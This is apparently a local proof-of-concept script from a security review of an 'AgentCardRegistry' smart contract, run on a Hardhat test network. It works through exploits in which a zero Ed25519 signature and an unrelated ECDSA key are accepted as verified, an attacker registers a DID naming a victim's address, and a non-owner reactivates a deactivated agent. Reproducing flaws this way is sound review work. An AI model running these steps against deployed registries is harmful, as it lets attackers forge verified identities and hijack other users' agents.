// Local-only reproduction; run from contracts/ethereum using hardhat --network hardhat.
import {createRequire} from 'node:module';
const require=createRequire(process.cwd()+'/package.json');
const {network}=await import(require.resolve('hardhat'));
const {ethers}=await network.connect('hardhat');
const [admin,attacker,victim]=await ethers.getSigners();
const hook=await (await ethers.getContractFactory('AgentCardVerifyHook')).deploy();await hook.waitForDeployment();
const registry=await (await ethers.getContractFactory('AgentCardRegistry')).deploy(await hook.getAddress());await registry.waitForDeployment();
const chainId=(await ethers.provider.getNetwork()).chainId;
const unrelatedKey=ethers.Wallet.createRandom().signingKey.publicKey;
const msg=ethers.solidityPackedKeccak256(['string','uint256','address','address'],['SAGE Agent Registration:',chainId,await registry.getAddress(),attacker.address]);
async function register(did,key,keyType,signature){
 const salt=ethers.hexlify(ethers.randomBytes(32));
 const hash=ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(['string','bytes[]','address','bytes32','uint256'],[did,[key],attacker.address,salt,chainId]));
 await (await registry.connect(attacker).commitRegistration(hash,{value:ethers.parseEther('0.01')})).wait();
 await ethers.provider.send('evm_increaseTime',[61]);await ethers.provider.send('evm_mine',[]);
 const p={did,name:'local-review-fixture',description:'',endpoint:'https://example.invalid',capabilities:'{}',keys:[key],keyTypes:[keyType],signatures:[signature],salt};
 await (await registry.connect(attacker).registerAgentWithParams(p)).wait();
 return {key:await registry.getKey(ethers.keccak256(key)),agent:await registry.getAgentByDID(did)};
}
const ed=await register('did:sage:ethereum:fixture-ed25519',ethers.hexlify(ethers.randomBytes(32)),1,'0x'+'00'.repeat(64));
const ec=await register('did:sage:ethereum:'+victim.address,unrelatedKey,0,await attacker.signMessage(ethers.getBytes(msg)));
const id=await registry.didToAgentId('did:sage:ethereum:'+victim.address);
await ethers.provider.send('evm_increaseTime',[3601]);await ethers.provider.send('evm_mine',[]);
await (await registry.activateAgent(id)).wait();
await (await registry.connect(attacker).deactivateAgentByHash(id)).wait();
const deactivated=!(await registry.getAgent(id)).active;
await (await registry.connect(victim).activateAgent(id)).wait();
const reactivated=(await registry.getAgent(id)).active;
console.log(JSON.stringify({deactivated_agent_reactivated_by_nonowner:deactivated&&reactivated,network:'local hardhat simulation; no public chain transactions',zero_ed25519_signature_marked_verified:ed.key.verified,unrelated_ecdsa_key_marked_verified:ec.key.verified,victim_address_did_registered_by_attacker:ec.agent.owner===attacker.address},null,2));
